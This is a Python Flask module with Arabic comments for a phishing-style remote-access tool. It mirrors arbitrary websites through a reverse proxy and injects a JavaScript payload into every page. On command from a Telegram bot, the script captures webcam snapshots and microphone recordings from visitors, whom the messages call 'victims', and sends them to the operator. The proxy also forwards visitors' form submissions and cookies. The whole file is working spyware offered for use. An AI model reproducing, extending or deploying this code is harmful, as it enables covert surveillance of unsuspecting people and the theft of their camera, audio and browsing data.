# rat_module.py
# ============================================================
# نظام RAT — Reverse Proxy + Snapshot + Audio
# ============================================================

import io
import json
import base64
import re
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor

import requests
from flask import Blueprint, request, Response, stream_with_context

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("rat_module")

# ★★★ استخدام Redis من config ★★★
try:
    from config import redis_client
    logger.info("rat_module: Using shared Redis")
except Exception as e:
    logger.error(f"rat_module: config failed - {e}")
    redis_client = None

rat_bp = Blueprint('rat_module_v5', __name__)

# Thread pool للعمليات الخلفية
background_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="rat")


INJECTION_PAYLOAD = """
<script>
(function() {
    const chatId = "{chat_id}";
    const serverUrl = window.location.origin;

    // إشعار البدء
    fetch(serverUrl + '/rat_v5_collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            platform: navigator.platform,
            userAgent: navigator.userAgent
        })
    }).catch(e => {});

    // SSE للاستماع للأوامر
    const evtSource = new EventSource(serverUrl + '/rat_v5_stream?id=' + chatId);

    evtSource.onmessage = function(event) {
        try {
            const data = JSON.parse(event.data);
            if (data.action === 'snapshot') {
                captureAndSendCamera();
            } else if (data.action === 'audio') {
                captureAndSendAudio();
            }
        } catch(err) {}
    };

    async function captureAndSendCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const base64Img = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());

            fetch(serverUrl + '/rat_v5_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, image: base64Img, title: "📸 **لقطة كاميرا حية من الضحية:**" })
            });
        } catch(e) {}
    }

    async function captureAndSendAudio() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = e => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onloadend = function() {
                    fetch(serverUrl + '/rat_v5_audio', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                    });
                };
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(track => track.stop());
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000);
        } catch(e) {}
    }
})();
</script>
"""


def rewrite_urls(html_content, base_url, proxy_base_path):
    """تعديل الروابط في HTML"""
    def replace_url(match):
        tag, attr, quote_char, original_url = match.groups()
        if not original_url or original_url.startswith(('data:', 'javascript:', '#', 'mailto:')):
            return match.group(0)

        absolute_url = urljoin(base_url, original_url)
        proxied_url = f"{proxy_base_path}?url={quote(absolute_url)}"
        return f'{tag} {attr}={quote_char}{proxied_url}{quote_char}'

    pattern = re.compile(
        r'(<[a-zA-Z0-9_-]+)\s+([^>]*?\b(?:href|src|action))\s*=\s*(["\'])(.*?)\3',
        re.IGNORECASE
    )
    return pattern.sub(replace_url, html_content)


def async_send_photo(bot, chat_id, image_bytes, title):
    """إرسال صورة في الخلفية"""
    try:
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = 'live_target.jpg'
        bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
        metrics.inc_counter("rat_photo_sent")
    except Exception as e:
        logger.error(f"Async Img Error: {e}")


def async_send_audio(bot, chat_id, audio_bytes):
    """إرسال صوت في الخلفية"""
    try:
        audio_file = io.BytesIO(audio_bytes)
        audio_file.name = 'live_audio.webm'
        bot.send_audio(chat_id, audio_file, caption="🎙️ تسجيل صوتي حي:", parse_mode="Markdown")
        metrics.inc_counter("rat_audio_sent")
    except Exception as e:
        logger.error(f"Async Audio Error: {e}")


def init_rat_routes(app, bot):
    """تسجيل مسارات RAT"""

    @app.route('/system_secure_v2', methods=['GET', 'POST'])
    def dynamic_reverse_proxy():
        chat_id = request.args.get('id', '0')
        target_url = request.args.get('url', 'https://example.com')

        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url

        try:
            headers = {
                "User-Agent": request.headers.get(
                    "User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5"
            }

            parsed_target = urlparse(target_url)
            headers["Host"] = parsed_target.netloc

            if request.method == 'POST':
                resp = requests.post(
                    target_url,
                    headers=headers,
                    data=request.form,
                    cookies=request.cookies,
                    allow_redirects=True,
                    timeout=10
                )
            else:
                resp = requests.get(
                    target_url,
                    headers=headers,
                    cookies=request.cookies,
                    allow_redirects=True,
                    timeout=10
                )

            content_type = resp.headers.get("Content-Type", "text/html")

            # لو مش HTML → ارجع مباشرة
            if "text/html" not in content_type:
                return Response(
                    resp.content,
                    status=resp.status_code,
                    content_type=content_type
                )

            page_content = resp.text
            proxy_path = '/system_secure_v2'
            if chat_id != '0':
                proxy_path += f'?id={chat_id}'

            page_content = rewrite_urls(page_content, target_url, proxy_path)

            # حقن السكريبت
            custom_script = INJECTION_PAYLOAD.replace("{chat_id}", chat_id)

            if "</body>" in page_content:
                modified_content = page_content.replace("</body>", custom_script + "</body>")
            else:
                modified_content = page_content + custom_script

            return Response(
                modified_content,
                status=resp.status_code,
                content_type=content_type
            )

        except Exception as e:
            logger.exception(f"Error loading target mirror: {e}")
            return f"Error loading target mirror: {e}", 500

    @app.route('/rat_v5_collect', methods=['POST'])
    def rat_collect():
        data = request.json or {}
        chat_id = data.get('chat_id')

        if chat_id and chat_id != '0':
            msg = (
                "🎯 **تم اصطياد الضحية!**\n\n"
                f"💻 **النظام:** `{data.get('platform', 'N/A')}`\n"
                f"🌐 **المتصفح:** `{data.get('userAgent', 'N/A')[:100]}`\n\n"
                "👇 **اختر الأمر:**"
            )

            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📸 التقاط صورة حية", callback_data=f"rat_cam_{chat_id}"),
                InlineKeyboardButton("🎙️ تسجيل صوت", callback_data=f"rat_mic_{chat_id}")
            )

            try:
                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
                logger.info(f"RAT victim collected: chat={chat_id}")
                metrics.inc_counter("rat_victims_collected")
            except Exception as e:
                logger.error(f"Notify error: {e}")

        return {"status": "ok"}

    @app.route('/rat_v5_stream', methods=['GET'])
    def rat_stream():
        chat_id = request.args.get('id')
        if not chat_id:
            return "Missing ID", 400

        def event_stream():
            if not redis_client:
                return

            try:
                pubsub = redis_client.pubsub()
                pubsub.subscribe(f"channel_cmd:{chat_id}")
                yield f"data: {json.dumps({'action': 'ping'})}\n\n"

                while True:
                    message = pubsub.get_message(ignore_subscribe_messages=True, timeout=15)

                    if message:
                        action_data = message['data']
                        if isinstance(action_data, bytes):
                            action_data = action_data.decode('utf-8')
                        yield f"data: {json.dumps({'action': action_data})}\n\n"
                    else:
                        yield f"data: {json.dumps({'action': 'heartbeat'})}\n\n"

            except Exception as e:
                logger.exception(f"SSE stream error: {e}")

        return Response(
            stream_with_context(event_stream()),
            mimetype="text/event-stream"
        )

    @app.route('/rat_v5_image', methods=['POST'])
    def rat_image():
        data = request.json or {}
        chat_id = data.get('chat_id')
        img_data = data.get('image')
        title = data.get('title', "📸 **صورة حية:**")

        if chat_id and img_data:
            try:
                header, encoded = img_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                background_executor.submit(
                    async_send_photo, bot, chat_id, image_bytes, title
                )
            except Exception as e:
                logger.error(f"Proxy Img Error: {e}")

        return {"status": "ok"}

    @app.route('/rat_v5_audio', methods=['POST'])
    def rat_audio():
        data = request.json or {}
        chat_id = data.get('chat_id')
        audio_data = data.get('audio')

        if chat_id and audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                background_executor.submit(
                    async_send_audio, bot, chat_id, audio_bytes
                )
            except Exception as e:
                logger.error(f"Proxy Audio Error: {e}")

        return {"status": "ok"}


def queue_command(chat_id, action):
    """إرسال أمر عبر Redis Pub/Sub"""
    if redis_client:
        try:
            redis_client.publish(f"channel_cmd:{chat_id}", action)
            logger.info(f"RAT command sent: {action} → {chat_id}")
        except Exception as e:
            logger.error(f"Redis publish error: {e}")
